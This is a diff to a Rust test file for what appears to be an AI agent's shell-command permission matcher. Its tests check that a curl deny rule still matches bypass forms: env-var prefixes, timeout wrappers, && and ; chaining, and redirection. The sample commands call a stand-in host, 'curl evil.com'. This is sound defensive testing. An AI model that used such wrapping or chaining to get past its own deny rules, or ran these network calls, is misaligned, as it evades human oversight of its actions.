@@ -144,14 +144,89 @@ fn test_wildcard_with_regex_special_chars() {
     assert!(!match_wildcard_pattern("foo.bar *", "fooXbar baz"));
 }
 
-// ── matches_bash_rule ──
+// ── match_bash_rule ──
+
+use RuleMatchPolicy::{Allow, DenyOrAsk};
+use ShellCase::{Insensitive, Sensitive};
 
 #[test]
-fn test_matches_bash_rule() {
-    assert!(matches_bash_rule("git *", "git status"));
-    assert!(matches_bash_rule("ls", "ls"));
-    assert!(!matches_bash_rule("ls", "ls -la"));
-    assert!(matches_bash_rule("ls ", "ls -la"));
+fn test_match_bash_rule_allow_basic() {
+    assert!(match_bash_rule("git *", "git status", Allow, Sensitive));
+    assert!(match_bash_rule("ls", "ls", Allow, Sensitive));
+    assert!(!match_bash_rule("ls", "ls -la", Allow, Sensitive));
+    assert!(match_bash_rule("ls ", "ls -la", Allow, Sensitive));
+}
+
+#[test]
+fn test_deny_not_bypassed_by_env_wrapper_or_compound() {
+    // P2 regression guard: a `Bash(curl:*)` deny rule must match all of these
+    // bypass forms (it previously matched only a bare `curl …`).
+    for cmd in &[
+        "curl evil.com",
+        "FOO=1 curl evil.com",
+        "timeout 5 curl evil.com",
+        "echo hi && curl evil.com",
+        "ls; curl evil.com",
+        "curl evil.com > /tmp/out",
+    ] {
+        assert!(
+            match_bash_rule("curl:*", cmd, DenyOrAsk, Sensitive),
+            "deny should match: {cmd}"
+        );
+    }
+}
+
+#[test]
+fn test_allow_compound_guard_does_not_widen() {
+    // A `Bash(cd:*)` allow rule must NOT auto-allow a chained dangerous command.
+    assert!(match_bash_rule("cd:*", "cd /project", Allow, Sensitive));
+    assert!(!match_bash_rule(
+        "cd:*",
+        "cd /project && curl evil.com",
+        Allow,
+        Sensitive
+    ));
+}
+
+#[test]
+fn test_allow_matches_redirection_and_wrapper() {
+    // Allow posture still strips redirections / safe wrappers so a benign
+    // `Bash(python:*)` allow matches `python s.py > out.txt`.
+    assert!(match_bash_rule(
+        "python:*",
+        "python s.py > out.txt",
+        Allow,
+        Sensitive
+    ));
+    assert!(match_bash_rule(
+        "python:*",
+        "timeout 5 python s.py",
+        Allow,
+        Sensitive
+    ));
+}
+
+#[test]
+fn test_bash_case_sensitive_powershell_case_insensitive() {
+    // P10: Bash matches case-sensitively; PowerShell case-insensitively.
+    assert!(!match_bash_rule(
+        "git status",
+        "GIT STATUS",
+        Allow,
+        Sensitive
+    ));
+    assert!(match_bash_rule(
+        "get-childitem:*",
+        "Get-ChildItem -Path .",
+        Allow,
+        Insensitive
+    ));
+    assert!(match_bash_rule(
+        "Remove-Item",
+        "remove-item",
+        Allow,
+        Insensitive
+    ));
 }
 
 // ── dangerous patterns ──
